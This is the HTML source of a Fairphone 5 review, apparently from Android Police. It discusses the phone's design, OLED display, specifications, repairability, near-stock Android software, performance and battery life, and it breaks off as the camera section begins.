<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-back-on-colorful-background" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-back-on-colorful-background.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>The Fairphone 5 looks a lot like its predecessor, the Fairphone 4. That’s not a bad thing. It shows that Fairphone has found a unique and recognizable design language that works and that makes it instantly recognizable. The Fairphone 5 retains the signature triangular camera setup in the top left of its removable plastic back, the same slightly rounded aluminum frame, and a more sizable bezel than what you would usually see in today’s smartphones. The visible design is not the whole story, though.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":2,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":754} -->
<p>The Fairphone 5 offers some significant industrial design improvements. While the Fairphone 4 clearly had some design compromises attached to make it repairable, the Fairphone 5 is only slightly bigger, heavier, and bulkier than other 2023 phones. If you’d put an assortment of budget and flagship phones from this year next to each other, you’d have a hard time picking out the Fairphone 5 as something that absolutely doesn’t fit. That in itself is a big achievement and makes me hopeful about future innovation in this space. If Fairphone, a small upstart company, can build a repairable smartphone that doesn’t look like it’s compromised, what’s stopping Apple and Google? (Profits, probably.)</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":2,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":2,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1487} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":3,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":3,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-lock-screen" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-lock-screen.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":4,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>The Fairphone 5’s biggest upgrade is its new OLED display, which, combined with the new hole-punch selfie camera, sets a couple of firsts for the company. It gets plenty bright, runs at a speedy 90Hz refresh rate, is protected by Gorilla Glass 5, and at 1224x2770, is as sharp as you'd hope for.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":3,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":4,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":545} -->
<p>I also appreciate the perfectly even bezels at the top and bottom. They may be bigger than what we see on other modern phones, but the fact that they’re even makes them, at the very least, aesthetically pleasing. From the looks of it, the screen is laminated to the glass — this is a compromise when it comes to repairability, as you can’t replace broken glass when the screen itself is still fine. Thankfully, you'll find it a much more immersive viewing experience because of its lamination.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":3,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":3,"nbrPlacementsScanned":4,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1060} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":4,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":4,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":4,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":5,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<h2 id="hardware-and-what-rsquo-s-in-the-box"> Hardware and what’s in the box </h2>
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-sim-and-sd-card" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-sim-and-sd-card.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":4,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":5,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>The rest of the hardware fits right in with the OLED display: The Fairphone 5 offers the specifications of an upper midrange phone. It comes with a 4,200mAh battery that charges at 30W, 256GB of microSD-expandable storage onboard, 8GB of RAM, and a Qualcomm QCM6490 processor. The latter is an outlier in the phone world — don't be surprised if it's the first you're hearing of it. Its a chipset usually applied to industrial or smart home applications, but it offers the big advantage of a longer support window that allows Fairphone to offer up to eight years of software support. It's pretty much equivalent to the Snapdragon 782G in all but name.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":4,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":5,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":912} -->
<p>What truly makes the Fairphone special is the fact that you can fully disassemble it yourself in a matter of minutes, using a standard screwdriver you likely have at home already. Once you pry off the back and remove the hand-removable battery (which you will have to take out whenever you want to access the SIM card or the microSD card, just like in the good old days), you can easily disassemble the phone and replace whatever modules need replacing.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":4,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":4,"nbrPlacementsScanned":5,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1365} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":5,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":5,"nbrPlacementsScanned":5,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="4080" height="2718" alt="fairphone-5-whats-in-the-box" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/wm/2023/09/fairphone-5-whats-in-the-box.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":5,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":5,"nbrPlacementsScanned":6,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>Despite the removable back, Fairphone still managed to get an IP55 water and dust resistance certification — something you don’t usually see in electronics you can take apart yourself. IP55 means that it offers basic protection from water and dust, but it’s not rated to be immersed in water. Try not to drop it in a puddle.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":5,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":5,"nbrPlacementsScanned":6,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":582} -->
<p>In the box, you’ll find nothing but the Fairphone 5, along with some warranty information and a quick start guide. Apart from the phone, all contents and the box itself are made exclusively from cardboard. You can use the box to ship in your old phone to have Fairphone recycle it, but that’s about everything you can get out of it.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":5,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":5,"nbrPlacementsScanned":6,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":926} -->
<p>Fairphone argues that you likely have a lot of the necessary accessories like a charger and a cable already lying around, and it doesn’t want to create more e-waste than necessary. If you do need a new cable and charger, the company offers some of their own that you can add to the cart while shopping. Otherwise, there are <a href="https://www.androidpolice.com/best-pps-chargers/">plenty of great chargers</a> and <a href="https://www.androidpolice.com/best-usb-c-cables/">high-quality USB-C cables</a> we recommend, too.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":5,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":5,"nbrPlacementsScanned":6,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1329} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":6,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":6,"nbrPlacementsScanned":6,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":6,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":6,"nbrPlacementsScanned":7,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<h2 id="software-and-performance"> Software and performance </h2>
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-home-screen" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-home-screen.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":6,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":6,"nbrPlacementsScanned":7,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>The Fairphone 5’s software comes very close to what Google offers on its Pixel phones, minus the company’s specific enhancements like Call Screen, always-on song recognition, and more. It’s basically stock Android with only a handful of extra tweaks, which should make it easy to feel right at home with it.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":6,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":6,"nbrPlacementsScanned":7,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":565} -->
<p>Fairphone entirely relies on Google apps to provide the default software experience, with all the usual suspects like Gmail, Maps, Calendar, Messages, and more on board — no needless duplicates anywhere. The one app that Fairphone itself pre-installs is the My Fairphone app, which offers a quick start guide, information on the company’s extended 5-year warranty, device information, and quick access to help. Something that surprised me, though, was that I found three of my German carrier’s apps pre-installed, too, which might be some form of cooperation with Fairphone. It’s a bummer that they can’t be uninstalled at all, at least while my SIM card is in it.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":6,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":6,"nbrPlacementsScanned":7,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1259} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":7,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>Speaking of the SIM card: Fairphone still insists on displaying your carrier’s name in the top left corner by default, taking away precious space that could be used for useful notifications. Thankfully, this can be easily and quickly disabled under system settings → <strong>Display → Network name.</strong></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":306} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":546} -->
<p><em>The setup process, including activating Fairphone's 5-year warranty, is simple</em></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":628} -->
<p>I’m also not a big fan of the launcher. It has the Google search bar hard-coded at the top of the first home screen, which puts it in an awkward and hard-to-reach position. If you prefer a less dense app grid, you only have the option to switch from the default 5x5 grid to a 4x4 and a 3x3 option, but no 4x5 option.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":950} -->
<p>This makes icons appear comically far apart from each other, and takes away one more row of apps that could easily fit the screen. I also wish the launcher would auto open the keyboard when opening the app drawer, like Pixel phones optionally offer. It’s mostly serviceable other than these points, though, and I’m sure these are all points that might not bother many people at all.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":7,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":7,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1344} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":8,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":8,"nbrPlacementsScanned":8,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>Fairphone promises to support the Fairphone 5 for up to eight years, with a potential extension to ten years in the cards. In that time frame, the company wants to provide five OS updates. On top of that, it makes it simple to install a different OS on the phone, like the aforementioned privacy-centric Murena — some units are even sold with it pre-installed. If history is any indicator, it may take Fairphone quite some time to port new Android releases to the Fairphone 5 the older it gets, though the industry-focused processor with its long-term support may help alleviate those problems.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":8,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":8,"nbrPlacementsScanned":9,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":600} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":8,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":8,"nbrPlacementsScanned":9,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":840} -->
<p>When it comes to performance, the midrange Snapdragon equivalent does a fine job for anything I throw at it today, be it extensive maps navigation, some light gaming, video streaming, and more. It barely ever stutters or has to take a break to think, and that’s promising for its long-term viability. However, the Fairphone 5 is supposed to last more than eight years. While the processor is good today, I’m not sure if it was a good idea to opt for a midrange processor rather than a high-end one, if only to have that extra performance overhead for the years to come. Think about it — the first Pixel phone arrived just seven years ago, and I’m sure it’s not nearly as usable today as it was in 2016.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":8,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":8,"nbrPlacementsScanned":9,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1572} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":9,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":9,"nbrPlacementsScanned":9,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<p>At the same time, it’s clear that Fairphone learned its lessons about processors. When I <a href="https://www.androidpolice.com/2019/12/03/fairphone-3-review/">reviewed the Fairphone 3</a>, it already exhibited severe performance problems right from its release. I don’t know if there was more optimization done to it to help it last longer, but there is only so much you can do to keep phone running well with underpowered hardware. For what it’s worth, I saw multiple people at IFA still using the Fairphone 3 this year, including a Fairphone PR representative who, I would assume, could have access to a newer Fairphone if they wanted to, and they seemed happy enough with it.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":9,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":9,"nbrPlacementsScanned":10,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":622} -->
<p>If you’re not pushing the boundaries of what mobile computing offers, I’m confident that the Fairphone 5 should last you for a long time, especially considering that Fairphone 3 experience in mind that I had at IFA. I still wish it had a flagship processor, though, just for that extra peace of mind. There is a reason why Apple keeps pushing the processor boundaries on its phones, something that allows it to sell brand-new older phones like the iPhone 13 with little to no performance issues two years after their initial release.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":9,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":9,"nbrPlacementsScanned":10,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1167} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":10,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->
<h2 id="battery-life-and-charging"> Battery life and charging </h2>
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-disassembled-battery" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg" src="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-disassembled-battery.jpg"> </picture> </figure> </div>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p>The 4,200mAh battery is also a wonderful throwback to past times. If you don’t like carrying <a href="https://www.androidpolice.com/best-power-banks/">a good old power bank</a> to top up your phone, you can consider simply getting a replacement battery early that you can throw in your bag for backup. This might be necessary in the longer run, since the 4,200mAh capacity it has is on the lower end of the modern spectrum.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":607} -->
<p>I used the Fairphone while covering IFA 2023 and when I was traveling on vacation, so I put it through its paces more than I normally would, but I felt that I had to recharge it more often than other phones, particularly compared to some Xiaomi and Honor phones out there.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":879} -->
<p>Given that Fairphone’s Android version is barely changed compared to stock Android — without the optimizations certain brands place on battery life that can result in missed notifications — this isn’t a perfectly negative downside. Here, apps run reliably and as expected in the background with timely notifications, something that can’t be said for Xiaomi and Honor.</p>
<!-- Repeatable debug data: {"injection":"before","adPosition":10,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":10,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":1276} --><!-- Zone: character count repeatable. --><!-- No ads allowed! --><!-- Repeatable debug data: {"injection":"after","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":11,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":0} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":240} -->
<p><em>The battery life can vary widely depending on whether you're on the go or on Wi-Fi at home</em></p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":334} -->
<p>The Fairphone 5 allows you to monitor your battery health with an extra section in the battery section. You can see the health in percentage, how many charge/discharge cycles your battery has had so far, and what the full mAh count should be for the battery. There are additional features to keep your battery healthy over a long period of time, like a Battery Protect option that limits the maximum battery life to 80% or a charging mode selector that lets you slow or speed up the charge speed.</p>
<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":830} -->

<!-- No repeatable ad for zone: character count repeatable. --><!-- Repeatable debug data: {"injection":"none","adPosition":11,"startingPoint":1,"skipEvery":null,"nbrPlacementFilledEachSkip":11,"nbrPlacementsScanned":12,"ruleCount":1000,"degradationStartingPoint":2,"actualCount":830} -->
<h2 id="camera"> Camera </h2>
<div data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg" data-modal-id="single-image-modal" data-modal-container-id="single-image-modal-container" data-img-caption="null"> <figure> <picture><!--[if IE 9]> <video style="display: none;"><![endif]--> <source media="(min-width: 1024px)" sizes="1500px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg?q=50&amp;fit=crop&amp;w=1500&amp;dpr=1.5"> <source media="(min-width: 768px)" sizes="943px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg?q=50&amp;fit=crop&amp;w=943&amp;dpr=1.5"> <source media="(min-width: 481px)" sizes="767px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg?q=50&amp;fit=crop&amp;w=767&amp;dpr=1.5"> <source media="(min-width: 0px)" sizes="480px" data-srcset="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg?q=50&amp;fit=crop&amp;w=480&amp;dpr=1.5"><!--[if IE 9]></video><![endif]--><img width="2048" height="1365" alt="fairphone-5-camera-interface" data-img-url="https://static1.anpoimages.com/wordpress/wp-content/uploads/2023/08/fairphone-5-camera-interface.jpg" 